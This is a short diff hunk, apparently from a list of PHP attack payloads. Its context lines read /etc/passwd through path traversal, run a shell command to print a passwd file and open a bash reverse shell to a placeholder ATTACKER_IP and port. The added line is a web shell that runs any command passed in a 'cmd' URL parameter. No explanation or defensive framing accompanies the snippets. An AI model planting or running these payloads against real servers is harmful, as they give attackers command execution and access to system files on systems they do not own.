@@ -14,3 +14,4 @@
     <?php echo file_get_contents('../../etc/passwd'); ?>
     <?php $output = shell_exec('cat ../../../.passwd'); echo "$output";  ?>
     <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'"); ?>
+    <?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>
